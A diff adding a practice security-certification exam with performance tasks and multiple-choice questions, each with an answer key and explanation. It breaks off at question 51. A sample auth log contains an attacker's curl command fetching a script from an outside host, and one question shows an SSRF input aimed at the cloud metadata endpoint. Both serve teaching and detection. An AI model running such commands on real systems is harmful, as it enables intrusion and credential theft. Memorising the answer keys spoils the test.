@@ -1,0 +1,759 @@
+# Exam: exam-1 | Practice exam 1 | 90
+A full practice exam: 5 performance-based questions and 80 multiple-choice questions across all five domains. You have 90 minutes; 750 on the 100-900 scale passes.
+
+@firewall p01 | Security operations | 6
+A small company has a staff network and a screened subnet with a web server and a mail gateway. One staff PC is infected and must be cut off until it is cleaned. Write the rules for the firewall between these networks and the internet. Rules are read top to bottom; the first rule that matches decides; anything no rule matches is denied.
+rows 6
+addr Internet = 0.0.0.0/0
+addr Staff LAN = 10.10.1.0/24
+addr Admin PC = 10.10.1.50/32
+addr Quarantined PC = 10.10.1.66/32
+addr Web server = 10.10.2.20/32
+addr Mail gateway = 10.10.2.25/32
+ports 22, 25, 53, 80, 443, 3389
+test allow | 203.0.113.40 -> 10.10.2.20 | 443/TCP | customers on the internet reach the web server over HTTPS
+test allow | 10.10.1.77 -> 10.10.2.20 | 443/TCP | staff on the LAN reach the web server over HTTPS
+test allow | 198.51.100.7 -> 10.10.2.25 | 25/TCP | outside mail servers can deliver email to the mail gateway
+test allow | 10.10.1.50 -> 10.10.2.20 | 22/TCP | the admin PC can manage the web server over SSH
+test allow | 10.10.2.25 -> 198.51.100.53 | 53/UDP | the mail gateway can look up names on outside DNS servers
+test deny | 10.10.1.77 -> 10.10.2.20 | 22/TCP | other staff PCs cannot open SSH to the web server
+test deny | 203.0.113.40 -> 10.10.2.20 | 3389/TCP | nobody on the internet can use Remote Desktop on the servers
+test deny | 10.10.1.66 -> 10.10.2.20 | 443/TCP | the quarantined PC reaches nothing at all, not even the web server
+rule DENY | Quarantined PC | Any | Any | Any
+rule ALLOW | Any | Web server | 443 | TCP
+rule ALLOW | Any | Mail gateway | 25 | TCP
+rule ALLOW | Admin PC | Web server | 22 | TCP
+rule ALLOW | Mail gateway | Any | 53 | UDP
+! The quarantine rule (DENY, source Quarantined PC, everything) must be at the top: the HTTPS rule allows Any source, which includes 10.10.1.66, so if the deny came after it the infected PC could still reach the web server. ALLOW Any to the web server on 443/TCP covers both customers and staff. ALLOW Any to the mail gateway on 25/TCP lets outside servers deliver mail (SMTP). SSH is allowed only from the Admin PC, so other staff PCs fall through to the implicit deny. DNS lookups use 53/UDP from the mail gateway to Any. Remote Desktop (3389) is never allowed, so the implicit deny blocks it; no explicit deny row is needed for it.
+
+@logs p02 | Threats, vulnerabilities and mitigations | 6
+The web server web1 sends its authentication log to the SIEM. Early on Monday an alert fires for this server. Read the log, mark the lines that show the attack, then answer the questions.
+@log /var/log/secure on web1
+  Mar  2 03:12:44 web1 sshd[2987]: Accepted publickey for alice from 10.10.1.50 port 51522 ssh2: ED25519 SHA256:Xk2v9QeLr0bN7tYw1sPz4uHc8mJd6aFg3oEi5nRq0Ts
+  Mar  2 03:12:44 web1 sshd[2987]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+  Mar  2 03:20:01 web1 CROND[3105]: pam_unix(crond:session): session opened for user root(uid=0) by (uid=0)
+  Mar  2 03:20:01 web1 CROND[3105]: pam_unix(crond:session): session closed for user root
+  Mar  2 03:31:17 web1 sshd[2987]: Received disconnect from 10.10.1.50 port 51522:11: disconnected by user
+* Mar  2 03:41:09 web1 sshd[3301]: message repeated 48 times: [ Failed password for root from 203.0.113.77 port 40112 ssh2]
+* Mar  2 03:42:30 web1 sshd[3315]: Failed password for invalid user oracle from 203.0.113.77 port 40166 ssh2
+  Mar  2 03:43:02 web1 sshd[3322]: Accepted publickey for backup from 10.10.1.20 port 60210 ssh2: RSA SHA256:b7Hq2Lw9Zt4Kp1Vn6Rc3Xy8Md5Fs0Ga2Je7Tu4Wo9Q
+  Mar  2 03:43:02 web1 sshd[3322]: pam_unix(sshd:session): session opened for user backup(uid=1005) by (uid=0)
+* Mar  2 03:43:55 web1 sshd[3340]: Accepted password for deploy from 203.0.113.77 port 40388 ssh2
+* Mar  2 03:44:12 web1 sudo[3402]:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.99/u.sh -o /tmp/u.sh
+* Mar  2 03:44:40 web1 useradd[3417]: new user: name=sysupdate, UID=1006, GID=1006, home=/home/sysupdate, shell=/bin/bash
+  Mar  2 03:47:15 web1 sshd[3322]: pam_unix(sshd:session): session closed for user backup
+@endlog
+? attack | What attack do the first marked lines (the failed passwords) show?
+- Password spraying: one common password tried slowly across many accounts
++ A brute-force (dictionary) attack against SSH accounts
+- Credential replay of a captured session token
+- An on-path attack between alice's PC and the server
+? first | The attacker is signed in as deploy and has created a new account. What should the responder do FIRST?
+- Reinstall the operating system on web1 from a known good image
+- Email the owner of the deploy account to ask whether the sign-in was theirs
++ Isolate web1 from the network, keeping it powered on, and disable the deploy and sysupdate accounts
+- Run a full vulnerability scan of the whole network
+?? control | Which TWO changes would BEST stop this attack from working again? (Choose two.)
++ Turn off SSH password sign-ins and allow only keys (PasswordAuthentication no)
+- Change the text of the SSH login banner
++ Allow SSH to web1 only from the admin network at the firewall
+- Keep the authentication log for one year instead of 90 days
+- Rename the alice account
+! Indicators: the 48 repeated root failures and the guess at the invalid user oracle, both from 203.0.113.77 (guessing passwords), then a password sign-in for deploy from the same outside address (the guess worked), deploy using sudo to download a script as root, and a new account sysupdate (persistence). The alice, backup and cron lines come from the LAN or the system and are normal. Attack: many rapid guesses against a few accounts from one address is brute force with a word list; spraying would be one password across many accounts, slowly. First response: contain. Isolating the server and disabling the accounts stops the attacker while keeping memory and disk as evidence; reinstalling now is recovery and destroys evidence, and email is too slow. Controls: key-only SSH makes password guessing useless, and limiting SSH to the admin network removes it from the internet; a banner, longer log retention or renaming alice would not stop the guessing.
+
+@match p03 | General security concepts | 6
+Match each need to the technique or tool that meets it BEST.
+columns Need | Technique or tool
+= Prove a software update came from the vendor and was not changed -> Digital signature
+= Keep only a stand-in value for each card number, with the real numbers in a separate secure vault -> Tokenization
+= Hide a short message inside an ordinary-looking photo -> Steganography
+= Keep a laptop's disk encryption key in a chip on the motherboard, released only if the boot was not tampered with -> Trusted Platform Module (TPM)
+= Create and guard a certificate authority's private keys in a tamper-resistant appliance in the data center -> Hardware security module (HSM)
+= Show call-center staff only the last four digits of a customer's phone number -> Data masking
+= Make stored password hashes slow to crack by running the hash function many thousands of times -> Key stretching
+x Key escrow
+x Symmetric encryption
+! A digital signature (a hash signed with the vendor's private key) proves origin and integrity. Tokenization swaps the real value for a token that is useless on its own; the mapping lives in a vault. Steganography hides that a message exists at all. A TPM is a chip in the computer that stores keys and checks the boot (measured boot); an HSM is a separate, often network-attached, appliance built to create and protect high-value keys such as a CA's. Data masking hides part of a value from people who don't need all of it. Key stretching (PBKDF2, bcrypt, Argon2) repeats the work so each guess costs more. Key escrow (a third party holding a copy of a key) and symmetric encryption (one shared key) do not fit any need as well.
+
+@place p04 | Security architecture | 6
+A company is redesigning its network into separate zones. Administrators must go through one hardened system before they can reach any device's admin interface. Place each device in the zone where it belongs.
+zone internet | Internet
+zone dmz | Screened subnet | Edge firewall
+zone servers | Internal servers | Internal firewall
+zone staff | Staff network | Internal firewall
+zone mgmt | Management network | Internal firewall
+device Reverse proxy for the public website -> dmz
+device Email security gateway that receives outside mail -> dmz
+device Database with customer records -> servers
+device Domain controller (directory server) -> servers
+device Employee desktop PCs -> staff
+device Jump server that administrators use to reach servers -> mgmt
+device Management interfaces of the switches and firewalls -> mgmt
+! The reverse proxy and the email security gateway take connections straight from the internet, so they go in the screened subnet, where a break-in does not reach the inside network directly. The customer database and the domain controller hold the most valuable data and should never be reachable from the internet, so they sit in the internal server zone behind the internal firewall. Employee PCs get their own staff zone, separate from the servers, so one infected PC cannot reach everything. The jump server and the devices' management interfaces belong in the management network: admins connect to the jump server first, and only it can reach the admin interfaces.
+
+@risk p05 | Security program management and oversight | 6
+A distribution company keeps its order servers in a basement room. The equipment and the work to rebuild the room are valued at $400,000. A flood would damage about 25% of that value. Based on past records, a flood like this is expected about once every 5 years. A contractor offers raised flooring, water sensors and a pump for $6,000 per year (spread over the life of the equipment), which would cut the expected floods to once every 20 years.
+calc sle | Single loss expectancy (SLE), in dollars | = 400000 * 0.25
+calc ale | Annualized loss expectancy (ALE) today, in dollars per year | = 400000 * 0.25 * 0.2
+calc ale2 | ALE with the contractor's controls, in dollars per year | = 400000 * 0.25 * 0.05
+? worth | Is the contractor's offer worth it?
++ Yes: it lowers the ALE by $15,000 a year and costs $6,000 a year, saving about $9,000 a year
+- No: it costs more each year than the ALE it removes
+- Yes, but only because it brings the ALE to zero
+- It can't be judged without the risk owner's name
+? strategy | Instead of the contractor, the company could buy flood insurance. Which risk strategy would that be?
+- Mitigation
+- Acceptance
++ Transference
+- Avoidance
+! SLE = asset value x exposure factor = $400,000 x 0.25 = $100,000. Once every 5 years is an ARO of 0.2, so ALE = SLE x ARO = $100,000 x 0.2 = $20,000 a year. Once every 20 years is an ARO of 0.05, so the new ALE = $100,000 x 0.05 = $5,000 a year. The control removes $15,000 of expected loss a year and costs $6,000, so it is worth it (net saving $9,000). It does not bring the ALE to zero. The control itself is mitigation; insurance moves the money impact to the insurer, which is transference.
+
+@choice q001 | General security concepts | 1
+A purchasing manager approves a large order in the company's workflow system and later claims she never approved it. The system recorded her approval with a digital signature made with her private key. Which security property does this MOST directly provide?
+- Confidentiality
+- Availability
++ Non-repudiation
+- Authorization
+! Only she holds her private key, so a valid signature shows she signed and that the record has not changed since: she cannot credibly deny it. That is non-repudiation. Confidentiality would need encryption; a signature does not hide the data.
+
+@choice q002 | General security concepts | 1
+A company is moving to a zero trust design. Every request from a laptop to the HR application must pass through a gateway that lets the session through or drops it, based on the decision it receives from the control plane. In zero trust terms, what is this gateway?
++ Policy enforcement point
+- Policy engine
+- Policy administrator
+- Implicit trust zone
+! The policy enforcement point (PEP) sits in the data plane and allows, watches or ends the connection. The policy engine makes the decision and the policy administrator passes it on and sets up the session; both are in the control plane.
+
+@choice q003 | General security concepts | 1
+An administrator plans a database upgrade for Saturday's maintenance window. The change board asks what will happen if the upgrade fails halfway and the application will not start. Which part of the change request answers this?
+- Impact analysis
+- Stakeholder list
+- Test results
++ Backout plan
+! The backout plan lists the steps to return to the last working state if the change fails. Impact analysis describes what the change affects and how risky it is, not how to undo it.
+
+@choice q004 | General security concepts | 1
+A security team adds a fake customer record with a unique email address to the production database. No real process ever uses it. If that address ever receives mail or shows up in a leak, the team will know the database was copied. What is this record?
+- Honeypot
++ Honeytoken
+- Honeynet
+- Data mask
+! A honeytoken is a fake piece of data (a record, a credential, an API key) that raises the alarm when someone uses it. A honeypot is a whole decoy system and a honeynet is a network of decoys.
+
+@choice q005 | General security concepts | 1
+Badge logs at a data center show visitors in the server hall who never badged in. Cameras show they walked in right behind employees. Which physical control would BEST stop this?
+- Bollards at the entrance
+- Brighter lighting in the car park
++ An access control vestibule at the server hall door
+- Pressure sensors under the raised floor
+! Following someone through a door is tailgating. An access control vestibule (once called a mantrap) has two doors and lets one person through at a time after each badges in. Bollards stop vehicles, not people.
+
+@multi q006 | General security concepts | 1
+A developer is building a sign-in system and must store passwords so that a stolen copy of the database is hard to crack. Which TWO measures should she use? (Choose two.)
+- Encrypt the passwords with AES and keep the key in the same database
++ Add a unique random salt to each password before hashing it
+- Hash each password once with MD5
++ Use a slow password hashing function such as Argon2 or bcrypt
+- Store the passwords in Base64 so they are not readable at a glance
+! A unique salt makes identical passwords hash differently and makes precomputed rainbow tables useless. A slow, key-stretching function makes every guess expensive. MD5 is fast and broken, Base64 is just encoding, and an encryption key stored next to the data is stolen with it.
+
+@choice q007 | General security concepts | 1
+A company needs one TLS certificate for www.example.com, shop.example.com and example.net, all served by the same load balancer. Which certificate feature makes this possible?
+- A wildcard certificate for *.example.com
++ Subject Alternative Name (SAN) entries that list each name
+- An extended validation (EV) certificate
+- OCSP stapling
+! The SAN extension can list many names, even in different domains. A wildcard for *.example.com covers names one level under example.com only, so it would not cover example.net. EV is about how the owner was checked, and OCSP stapling is about revocation checks.
+
+@choice q008 | General security concepts | 1
+A hospital runs a laboratory analyzer on an old operating system the vendor no longer patches, and it cannot be replaced for two years. The team moves it to an isolated network segment and adds extra monitoring. What type of control have they put in place?
+- Deterrent
++ Compensating
+- Directive
+- Corrective
+! A compensating control stands in when the normal control (here, patching) is not possible, reducing the risk another way. A corrective control fixes things after an incident; a directive control tells people what to do.
+
+@choice q009 | Threats, vulnerabilities and mitigations | 1
+An investigation finds that an attacker stayed hidden in a defense contractor's network for 14 months, used custom tools never seen before, and quietly copied engineering designs. Nothing was encrypted or sold. Which threat actor is MOST likely responsible?
++ A nation-state
+- An unskilled attacker
+- A hacktivist
+- Organized crime
+! A long, quiet stay, new custom tools and stealing designs point to espionage by a well-funded nation-state. Organized crime wants money quickly (ransom, selling data), and hacktivists want publicity for a cause.
+
+@choice q010 | Threats, vulnerabilities and mitigations | 1
+The accounts payable team gets an email from a supplier's real email account, inside an existing thread, asking that future payments go to a new bank account. The supplier later says its mailbox had been taken over. What kind of attack is this?
+- Typosquatting
+- Watering hole
++ Business email compromise
+- Smishing
+! Business email compromise (BEC) uses a taken-over or spoofed business mailbox to trick staff into sending money. Typosquatting would use a lookalike domain, but this came from the real account. The defense is to confirm bank changes by phone on a number already on file.
+
+@choice q011 | Threats, vulnerabilities and mitigations | 1
+Several engineers at a small chip design firm are infected after visiting an industry forum they all read. The forum's site had been changed to serve malware only to visitors from the firm's address range. Which attack does this describe?
+- Brand impersonation
+- Pretexting
+- Spear phishing
++ Watering hole
+! A watering hole attack compromises a site the targets are known to visit, then waits for them. Spear phishing sends a targeted message; here no message was sent.
+
+@choice q012 | Threats, vulnerabilities and mitigations | 1
+An employee gets a phone call from someone who says he is from the IT help desk and is fixing a mailbox problem. He asks her to read out the six-digit code that just arrived on her phone. Which social engineering technique is the caller using?
+- Smishing
++ Vishing
+- Typosquatting
+- Misinformation
+! Vishing is voice phishing: the trick happens on a phone call. The code came by text, but the attack itself is the call; smishing would be a fraudulent text message. No real help desk asks for a sign-in code.
+
+@choice q013 | Threats, vulnerabilities and mitigations | 1
+A managed service provider (MSP) that runs IT for forty small businesses has its remote management tool compromised. Within an hour, ransomware is pushed to its customers' servers through that tool. Which attack vector is this?
+- Removable device
+- Open service port
++ Supply chain
+- Default credentials
+! The attack reached the businesses through a trusted third party they depend on, which is a supply chain attack (here through a managed service provider).
+
+@choice q014 | Threats, vulnerabilities and mitigations | 1
+A program checks that a user may write to a file, then a few milliseconds later opens the file and writes to it. An attacker swaps the file for a link to a system file between the check and the write. Which vulnerability is this?
+- Buffer overflow
++ Time-of-check to time-of-use (TOC/TOU) race condition
+- Memory injection
+- Malicious update
+! The flaw is the gap between checking and using: the attacker changes the file in that window. That is a TOC/TOU race condition. A buffer overflow writes past the end of a memory buffer.
+
+@choice q015 | Threats, vulnerabilities and mitigations | 1
+Visitors to a community recipe site report pop-ups and being signed out. An analyst finds that one recipe's comment field holds <script> code that runs in every visitor's browser and sends their session cookie to another server. Which attack is this?
+- SQL injection
+- Directory traversal
+- Server-side request forgery
++ Cross-site scripting (XSS)
+! Script that the site stores and then runs in other visitors' browsers is stored cross-site scripting. Output encoding, input validation and HttpOnly cookies help. SQL injection attacks the database, not the visitors' browsers.
+
+@choice q016 | Threats, vulnerabilities and mitigations | 1
+A cloud provider patches a flaw that let code inside one guest virtual machine read and write memory belonging to the hypervisor. What is the main risk of this kind of flaw?
++ VM escape, which could let an attacker reach other customers' virtual machines on the same host
+- Resource reuse, where a new disk image still holds an old customer's files
+- Jailbreaking, which removes the vendor's limits on a phone
+- Side loading of unsigned virtual machine images
+! Breaking out of a guest into the hypervisor is VM escape, and from there the attacker could reach every VM on that host. Resource reuse is about leftover data in memory or storage handed to a new tenant.
+
+@choice q017 | Threats, vulnerabilities and mitigations | 1
+A mobile device management (MDM) report shows that several company phones have apps installed from files downloaded from websites instead of the official app store. What is this practice called?
+- Jailbreaking
+- Rooting
++ Side loading
+- Tethering
+! Side loading is installing apps from outside the official store, which skips the store's checks. Jailbreaking (iPhone) and rooting (Android) remove the operating system's own restrictions; they make side loading easier but are not the same thing.
+
+@choice q018 | Threats, vulnerabilities and mitigations | 1
+A database administrator who left the company last month had set a script to delete the customer tables on the first day of the next quarter, but only if his own account no longer exists. What is this?
+- A worm
++ A logic bomb
+- Spyware
+- Bloatware
+! A logic bomb is code that waits for a condition or date and then does damage. A worm spreads itself between systems.
+
+@choice q019 | Threats, vulnerabilities and mitigations | 1
+Sign-in logs show one failed attempt for each of 600 user accounts, all within ten minutes, from the same few cloud addresses. Thirty minutes later the same pattern repeats. No account was locked out. Which attack is MOST likely?
+- Brute force against a single account
+- A rainbow table attack
+- Credential replay
++ Password spraying
+! Password spraying tries one or two common passwords against many accounts, slowly enough to stay under the lockout limit. Brute force hammers one account with many guesses, and rainbow tables are used offline against stolen hashes.
+
+@multi q020 | Threats, vulnerabilities and mitigations | 1
+An analyst is reviewing alerts for a sales manager's account. Which TWO findings are the strongest signs that someone else is using her credentials? (Choose two.)
++ A sign-in from Lisbon 20 minutes after a sign-in from Chicago
+- Her laptop restarted at 03:00 to install monthly updates
++ Two active sessions at the same time from different countries
+- She changed her password after the 90-day reminder
+- Her mailbox grew by 2 GB over the last year
+! Impossible travel (no one can get from Chicago to Lisbon in 20 minutes) and concurrent sessions from different countries both show a second person using the account. Planned update restarts, routine password changes and slow mailbox growth are normal.
+
+@choice q021 | Threats, vulnerabilities and mitigations | 1
+A company's website goes down. Its firewall shows a flood of large DNS responses arriving from thousands of open DNS resolvers, although the company never sent those queries. What kind of attack is this?
+- DNS cache poisoning
++ A reflected and amplified DDoS attack
+- Domain hijacking
+- An on-path attack
+! The attacker sends small queries with the victim's address forged as the source; the resolvers send much larger answers to the victim. That is reflection (the traffic bounces off others) plus amplification (answers bigger than questions). Cache poisoning plants false answers in a resolver instead.
+
+@choice q022 | Threats, vulnerabilities and mitigations | 1
+During a test, an attacker on the same Wi-Fi network interferes with the start of each TLS connection so that the client and server settle on an old protocol version with weak ciphers. Which attack is this?
++ Downgrade attack
+- Collision attack
+- Birthday attack
+- Replay attack
+! Forcing both sides onto an older, weaker protocol is a downgrade attack. Turning off old versions (allowing only TLS 1.2 and 1.3) prevents it. Collision and birthday attacks target hash functions.
+
+@choice q023 | Threats, vulnerabilities and mitigations | 1
+A web app can fetch a picture from any web address a user types. An attacker enters http://169.254.169.254/latest/meta-data/ and the page shows the cloud server's internal settings, including temporary access keys. Which attack is this?
+- Cross-site request forgery (CSRF)
+- Directory traversal
++ Server-side request forgery (SSRF)
+- Cross-site scripting (XSS)
+! The attacker makes the server itself send a request to an internal address it can reach and the attacker cannot: server-side request forgery. CSRF tricks a signed-in user's browser into sending a request.
+
+@choice q024 | Threats, vulnerabilities and mitigations | 1
+Public kiosks in a library should run only a web browser and the catalog app. Staff keep finding games and other programs that visitors managed to install and run. Which control would BEST stop any other program from running?
+- A host-based firewall
+- Full disk encryption
++ An application allow list
+- A stronger password policy
+! An application allow list lets only approved programs run and blocks everything else, whatever it is. A host firewall controls network traffic, not which programs start.
+
+@multi q025 | Threats, vulnerabilities and mitigations | 1
+A company is installing 40 new network cameras. Which THREE steps would BEST harden them before they go live? (Choose three.)
++ Change the default administrator password on every camera
+- Turn on UPnP so each camera can open the ports it needs on the router
++ Turn off services the cameras do not need, such as Telnet
+- Leave the SNMP community string as "public" so monitoring works
++ Install the latest firmware from the manufacturer
+- Give each camera a public IP address for easy remote viewing
+! Changing default passwords, disabling unneeded services and patching firmware all shrink the attack surface. UPnP, default SNMP strings and public addresses all expose the cameras to more attackers.
+
+@choice q026 | Threats, vulnerabilities and mitigations | 1
+A server's antivirus reports nothing, yet a network sensor sees it sending data to an unknown address every night. An analyst boots the server from a trusted USB drive and scans its disk. She finds altered system drivers that hide a process and its files from the running operating system. What did she find?
+- Spyware
+- A keylogger
+- A trojan
++ A rootkit
+! A rootkit changes the operating system (often its drivers or kernel) to hide itself, which is why tools running on the infected system saw nothing and an offline scan found it.
+
+@choice q027 | Security architecture | 1
+A company runs its order system on virtual machines rented from an infrastructure as a service (IaaS) provider. A critical flaw is announced in the Linux version running on those VMs. Who is responsible for patching it?
++ The company, because in IaaS the customer manages the guest operating systems
+- The cloud provider, because it owns the hardware
+- The Linux vendor, which must log in and patch every affected VM
+- Nobody, because cloud VMs are always patched automatically
+! Under the shared responsibility model for IaaS, the provider looks after the buildings, hardware and hypervisor, and the customer looks after the operating system, apps and data on its VMs.
+
+@choice q028 | Security architecture | 1
+A team wants to run a small piece of code each time a file is uploaded, pay only while it runs, and never manage or patch a server operating system. Which model fits BEST?
+- Virtual machines from an IaaS provider
+- Containers on the company's own servers
++ Serverless functions
+- A dedicated physical server in a colocation center
+! With serverless, the provider runs and patches everything under the code and charges per run. The team still has to secure its code and permissions.
+
+@choice q029 | Security architecture | 1
+A cloud team builds its networks and servers from template files kept in version control. Every change is reviewed, and the same templates build test and production. What is the main security benefit of this infrastructure as code approach?
+- It removes the need for access control in the cloud account
++ Environments are built the same way every time, so mistakes and drift are easier to spot and fix
+- It encrypts all data stored in the cloud automatically
+- It makes the cloud provider responsible for configuration errors
+! Infrastructure as code gives repeatable, reviewed, versioned builds, so a mistake can be caught in review and a changed system compared with its template. It does not replace access control or encryption.
+
+@choice q030 | Security architecture | 1
+An administrator says that moving an app from virtual machines into containers on one host gives exactly the same isolation. Why is that not quite true?
+- Containers cannot use network segmentation
+- Containers always run with administrator rights
+- Containers cannot be scanned for vulnerabilities
++ Containers on a host share that host's operating system kernel, while each VM has its own
+! Containers are lighter because they share the host's kernel, so a kernel flaw can affect all of them. Each VM runs its own operating system on the hypervisor, which is a stronger wall.
+
+@multi q031 | Security architecture | 1
+A water utility's pumping station is run by an industrial control system (ICS) whose controller software cannot be patched, because the vendor no longer supports it. Which TWO controls would BEST reduce the risk? (Choose two.)
+- Install a standard antivirus agent on the controller
++ Put the ICS on its own network segment that only the control room can reach
+- Make the operator screen reachable from the internet with a strong password
++ Monitor the ICS network for traffic that is not normal for it
+- Restart the controller every night
+! When a system cannot be patched, isolate it and watch it: segmentation limits who can reach it and monitoring spots unusual traffic. Controllers usually cannot run normal antivirus, and putting the operator screen on the internet adds risk.
+
+@choice q032 | Security architecture | 1
+An online shop puts an intrusion prevention system (IPS) inline in front of its web servers. Managers decide that if the IPS crashes, sales must continue even without inspection. How should the IPS be set to fail?
++ Fail-open
+- Fail-closed
+- Fail-secure
+- As a passive tap
+! Fail-open lets traffic keep flowing when the device fails, putting availability first. Fail-closed (also called fail-secure) blocks everything, putting security first. A passive tap could not block anything in normal use either.
+
+@choice q033 | Security architecture | 1
+A security team wants to watch traffic between two core switches without any risk of slowing or breaking it. Its sensor gets a copy of the traffic from a network tap. What can this sensor do?
+- Block malicious packets before they reach the servers
++ Detect and alert on suspicious traffic, but not stop it
+- Act as a jump server for administrators
+- Balance the load between the switches
+! A sensor on a tap is passive: it sees a copy, so it can detect and alert (IDS) but cannot drop the real packets. Blocking needs an inline device such as an IPS.
+
+@choice q034 | Security architecture | 1
+Two offices connect over the internet with IPsec. The whole original packet, including its internal addresses, must be encrypted and wrapped in a new packet between the two gateways. Which choice does this?
+- AH in transport mode
+- AH in tunnel mode
+- ESP in transport mode
++ ESP in tunnel mode
+! ESP encrypts; AH only proves integrity and origin, with no encryption. Tunnel mode wraps the whole original packet in a new one (site-to-site VPNs); transport mode protects only the payload between two hosts.
+
+@choice q035 | Security architecture | 1
+A company with many remote workers and small branches wants its network security (secure web gateway, firewall, zero trust access) delivered from the cloud close to each user, combined with its SD-WAN. Which architecture is this?
+- A screened subnet
+- An air-gapped network
++ Secure access service edge (SASE)
+- A jump server
+! SASE joins SD-WAN networking with cloud-delivered security services, so users are protected wherever they work. A screened subnet is a zone at one site's edge.
+
+@choice q036 | Security architecture | 1
+A European company stores customer records with a cloud provider. Its lawyers warn that copies must not be kept in data centers in other countries, because the data would then also fall under those countries' laws. Which concept are they describing?
++ Data sovereignty
+- Data masking
+- Data in use
+- Tokenization
+! Data sovereignty means data is subject to the laws of the country where it is stored. Companies handle it with geographic restrictions on where the provider may keep data.
+
+@choice q037 | Security architecture | 1
+A payroll application decrypts salary records into memory to calculate taxes. The server's disk is encrypted and its network traffic uses TLS. Which data state do these two controls leave unprotected?
+- Data at rest
+- Data in transit
++ Data in use
+- Data sovereignty
+! Disk encryption protects data at rest and TLS protects data in transit, but the records are readable in memory while being processed: data in use. Secure enclaves are one way to protect it.
+
+@choice q038 | Security architecture | 1
+A stock trading firm must be running again within minutes if its main data center is lost, and it will pay for a second site with live copies of its systems and data. Which kind of site does it need?
+- A warm site
+- A cold site
+- An offsite tape vault
++ A hot site
+! A hot site is fully equipped and kept up to date, so it can take over almost at once. A warm site has hardware but needs data and setup (hours or days); a cold site is mostly an empty room with power.
+
+@choice q039 | Security architecture | 1
+A file server gets a full backup every Sunday night and a differential backup every other night. It fails on Thursday afternoon. Which backups are needed to restore it as of Wednesday night?
+- Sunday's full backup and the Monday, Tuesday and Wednesday differentials
++ Sunday's full backup and Wednesday's differential only
+- Wednesday's differential only
+- Every backup since last month's full backup
+! A differential holds every change since the last full backup, so the full plus the latest differential is enough. With incremental backups, every one since the full would be needed.
+
+@multi q040 | Security architecture | 1
+A clinic wants its servers to stay up through power cuts that can last up to eight hours. Which TWO items together BEST meet this need? (Choose two.)
++ An uninterruptible power supply (UPS) to carry the load for the first minutes
+- A surge protector power strip
++ A generator with enough fuel for the whole outage
+- A second internet connection from another provider
+- A cold site
+! The UPS keeps power steady the moment the mains fails and bridges the time until the generator starts; the generator then runs for hours. A surge protector does nothing in an outage.
+
+@choice q041 | Security operations | 1
+A company wants to buy phones for staff, keep full control of them through MDM, and still let employees use them for some personal apps. Which deployment model is this?
+- Bring your own device (BYOD)
+- Choose your own device (CYOD)
++ Corporate-owned, personally enabled (COPE)
+- Virtual desktop infrastructure (VDI)
+! COPE phones belong to the company, which manages them, but personal use is allowed. BYOD phones belong to the employee, and CYOD lets the employee pick a model from an approved list.
+
+@choice q042 | Security operations | 1
+A company wants each employee to join the office Wi-Fi with their own directory account, so that when someone leaves, their Wi-Fi access ends with their account. Which setup fits BEST?
+- WPA3-Personal with a long shared passphrase
++ WPA3-Enterprise using 802.1X with a RADIUS server
+- WPA2-Personal with MAC address filtering
+- An open network with a captive portal
+! Enterprise mode checks each person's own credentials through 802.1X and a RADIUS server, so disabling the account ends access. A shared passphrase would have to be changed for everyone when one person leaves.
+
+@choice q043 | Security operations | 1
+A company's lawyers learn that a former employee is suing over her dismissal. They tell IT to stop the normal deletion of her old mailbox and files. What is this called?
++ A legal hold
+- Chain of custody
+- E-discovery
+- A data retention policy
+! A legal hold suspends normal deletion so evidence is preserved for a lawsuit. E-discovery is the later work of finding and handing over that data; chain of custody records who handled evidence.
+
+@choice q044 | Security operations | 1
+A year after the servers were built, many no longer match the secure baseline the team set for them. Which approach would BEST find these differences regularly with little effort?
+- Ask each server owner to fill in a yearly questionnaire
+- Run a penetration test once a year
++ Scan the servers on a schedule with a SCAP-based compliance tool against the baseline (such as a CIS benchmark)
+- Review the firewall logs each month
+! Automated compliance scans compare each server with the baseline settings and report drift, as often as needed. Questionnaires depend on people's memory and a yearly penetration test looks for ways in, not for every setting.
+
+@choice q045 | Security operations | 1
+A company is getting rid of 200 old laptops with solid state drives through a recycling vendor. Auditors want proof that the data was destroyed. What should the company get from the vendor?
+- A copy of the vendor's acceptable use policy
+- The laptops' original purchase orders
+- Screenshots of the drives being formatted
++ A certificate of destruction (or sanitization) listing each drive
+! A certificate of destruction or sanitization, listing serial numbers, is the evidence auditors expect. A quick format does not remove the data.
+
+@choice q046 | Security operations | 1
+A vulnerability scan of the Windows servers reports only open ports and service banners. It misses missing patches the team knows are there. What would MOST improve the results?
++ Run a credentialed scan with an account that can sign in to the servers
+- Run the scan from outside the firewall
+- Switch to a non-intrusive scan
+- Scan less often to reduce the load
+! A credentialed scan signs in and reads installed software, patch levels and settings, so it finds far more than a scan that only sees the network side.
+
+@choice q047 | Security operations | 1
+A scanner flags a web server for an OpenSSH flaw, based only on the version number it saw. The administrator shows that the Linux distribution already fixed that flaw in a backported patch, and the installed package has the fix. How should the finding be treated?
+- As a false negative
++ As a false positive
+- As a zero-day
+- As a true positive that needs an exception
+! The scanner reported a problem that is not really there: a false positive. A false negative is the opposite, a real problem the scanner missed.
+
+@multi q048 | Security operations | 1
+A team has hundreds of open vulnerability findings and can fix only a few this week. Which TWO facts should weigh MOST in deciding what to fix first? (Choose two.)
++ The CVSS score of each finding
+- The alphabetical order of the host names
++ Whether the affected system faces the internet or holds sensitive data
+- The age of the scanner software
+- Which administrator last worked on the server
+! Priority comes from how severe the flaw is (CVSS) and how exposed and important the system is (environmental factors, impact on the business). The other choices say nothing about risk.
+
+@choice q049 | Security operations | 1
+An administrator reports that a critical vulnerability on twelve servers has been patched. What is the BEST way to validate the fix?
+- Close the ticket based on the administrator's report
+- Add the servers to the exception list
++ Rescan the servers to confirm the vulnerability no longer shows
+- Buy cyber insurance for the servers
+! Rescanning (or another independent check) proves the fix worked on every server. An exception or insurance would be other responses, not validation.
+
+@choice q050 | Security operations | 1
+A security team wants to collect logs from firewalls, servers and cloud services in one place, link related events from different sources, and raise an alert when a pattern matches an attack. Which tool does this?
+- A NetFlow collector
+- A file integrity monitor
+- A vulnerability scanner
++ Security information and event management (SIEM)
+! A SIEM aggregates logs, correlates events across sources and alerts on rules. NetFlow shows only who talked to whom.
+
+@choice q051 | Security operations | 1
+A network engineer needs to know which internal hosts talked to which outside addresses, how many bytes they sent and when, for the last 90 days. Full packet captures would need too much storage. Which data source fits BEST?
++ NetFlow records
+- SNMP traps
+- Full packet captures of the internet link
+- DNS filtering block pages
